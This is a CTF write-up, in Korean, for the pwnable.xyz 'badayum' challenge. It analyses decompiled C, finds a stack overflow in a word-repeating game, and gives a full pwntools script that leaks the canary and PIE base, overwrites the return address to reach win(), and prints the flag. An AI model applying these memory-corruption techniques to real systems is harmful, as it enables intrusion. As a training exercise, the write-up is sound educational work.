# [pwnable.xyz] badayum

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Let's count words.
>
> Release: [badayum.zip](https://github.com/h0meb0dy/pwnable.xyz/files/9008442/badayum.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/176383676-8c9d8719-8fbb-4cd7-8e21-61d9c44cca54.png)

## Analysis

### `win()`

```c
int win()
{
  return system("cat flag");
}
```

`win()`(`sub_D30()`)이 실행되도록 하면 플래그를 획득할 수 있다.

### `setup()`

```c
void sub_CB8()
{
  unsigned int v0; // eax

  setvbuf(&IO_2_1_stdout_, 0LL, 2, 0LL);
  setvbuf(&IO_2_1_stdin_, 0LL, 2, 0LL);
  signal(14, handler);
  alarm(0xF0u);
  v0 = time(0LL);
  srand(v0);
}
```

`time(0)`으로 가져온 현재 시간을 `srand()`의 인자로 전달해서 랜덤 시드를 설정한다.

### `main()`

```c
__int64 __fastcall main(__int64 argc, char **argv, char **envp)
{
  setup(argc, argv, envp);
  puts("Yolo yada yada - Play with me!");
  puts("===========================================");
  play("===========================================");
  return 0LL;
}
```

`setup()`을 실행하고 `play()`를 호출한다.

### `generate_computer_words()`

```c
char *generate_computer_words()
{
  int computer_words_len; // [rsp+8h] [rbp-78h]
  int i; // [rsp+Ch] [rbp-74h]
  int j; // [rsp+10h] [rbp-70h]
  int k; // [rsp+14h] [rbp-6Ch]
  char *computer_words; // [rsp+18h] [rbp-68h]
  int v6[22]; // [rsp+20h] [rbp-60h]
  unsigned __int64 v7; // [rsp+78h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  computer_words_len = 0;
  for ( i = 0; i <= 19; ++i )
    v6[i] = rand() % 10;
  for ( j = 0; j <= 19; ++j )
    computer_words_len += strlen((&words)[v6[j]]);
  computer_words = (char *)malloc(computer_words_len + 20);
  memset(computer_words, 0, computer_words_len + 20);
  for ( k = 0; k <= 19; ++k )
  {
    strcat(computer_words, (&words)[v6[k]]);
    if ( k <= 18 )
      *(_WORD *)&computer_words[strlen(computer_words)] = '-';
  }
  return computer_words;
}
```

전역 변수 `words`에는 몇 가지 단어들이 저장되어 있다.

![](https://user-images.githubusercontent.com/104156058/176387330-c1ed54aa-1bee-4f60-8650-ce205ddd0bd9.png)

`words`에서 랜덤하게 단어를 20번 선택해서 하이픈(`-`)으로 이어붙인다. 그러면 아래와 같은 형태의 문자열이 `computer_words`에 저장되어 반환된다.

```
dayum-yadam-yadayada-dada-yadam-yadam-yadayada-yada-dayum-dada-yadayada-dayam-dayam-yada-dayum-dayam-dayum-badum-yadum-yadum
```

### `play()`

```c
    computer_words = generate_computer_words();
```

먼저 `generate_computer_words()`를 실행하여 `computer_words`를 생성한다.

```c
    memset(player_words, 0, 100uLL);
    printf("Your score: %d\n", score);
    printf("me  > %s\n", computer_words);
    printf("you > ");
    computer_words_len = strlen(computer_words);
    read(0, player_words, computer_words_len + 1);
```

`player_words`에 `computer_words`의 길이보다 1만큼 크게 입력을 받는다.

```c
    if ( !strncmp(player_words, "exit", 4uLL) )
      break;
```

`exit`을 입력하면 반복문을 빠져나가서 함수를 종료한다.

```c
    _computer_words_len = strlen(computer_words);
    if ( !strncmp(computer_words, player_words, _computer_words_len) )
    {
      printf("You said: %s", player_words);
      puts("Yay, you're good at this, let's go on :)\n");
      ++score;
    }
    else
    {
      printf("You said: %s", player_words);
      puts("I don't think you understood how this game works :(\n");
      --score;
    }
    free(computer_words);
```

먼저 `player_words`를 `"%s"`로 출력한 후에, `computer_words`와 `player_words`를 `computer_words`의 길이만큼 비교하여, 같으면 `score`를 1 증가시키고 다르면 1 감소시킨다.

## Exploit

`generate_computer_words()`로 생성되는 `computer_words`의 길이는 최대 `179`이다(`yadayada`만 20번 선택되는 경우). 최대 길이가 아니라도, `play()`에서 `player_words` 버퍼의 크기는 `104`라서 충분히 BOF가 발생할 수 있다.

BOF를 이용해서 먼저 canary를 leak하고, `play()`의 return address(`main+54`)를 leak하여 `win()`의 주소를 계산할 수 있다. 그리고 나서 `play()`의 return address를 `win()`의 주소로 덮어쓰면 플래그를 획득할 수 있다.

### Full exploit

```python
from pwn import *

LOCAL = False

if LOCAL:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30027)

sla = r.sendlineafter
sa = r.sendafter

win_offset = 0xd30 # offset of win() from PIE base


# canary leak

while 1:
    r.recvuntil('me  > ')
    computer_words = r.recvline()[:-1]
    computer_words_len = len(computer_words)

    if computer_words_len < 0x69:
        sa('you > ', 'A')
    else:
        sa('you > ', 'A' * 0x69)
        break

r.recvuntil('A' * 0x69)
canary = u64(r.recvn(7).rjust(8, b'\x00'))
log.info('canary: ' + hex(canary))


# PIE leak

while 1:
    r.recvuntil('me  > ')
    computer_words = r.recvline()[:-1]
    computer_words_len = len(computer_words)

    if computer_words_len < 0x78:
        sa('you > ', 'A')
    else:
        sa('you > ', 'A' * 0x78)
        break

r.recvuntil('A' * 0x78)
pie = u64(r.recvn(6).ljust(8, b'\x00')) - 0x1081 # PIE base
log.info('PIE base: ' + hex(pie))
win = pie + win_offset


# RET overwrite

payload = b'A' * 0x68
payload += p64(canary)
payload += b'A' * 8
payload += p64(win + 4)[:6]

payload_len = len(payload)

while 1:
    r.recvuntil('me  > ')
    computer_words = r.recvline()[:-1]
    computer_words_len = len(computer_words)

    if computer_words_len < payload_len:
        sa('you > ', 'A')
    else:
        sa('you > ', payload)
        break

sa('you > ', 'exit') # return play()


r.interactive()
```

```
$ python3 ex.py
[+] Opening connection to svc.pwnable.xyz on port 30027: Done
[*] canary: 0x46a2e29d40554100
[*] PIE base: 0x564da41fe000
[*] Switching to interactive mode
Ya go away, I don't want to play with you anymore anyways :P

FLAG{badayum-yadam-dayum-yadam-badum}
```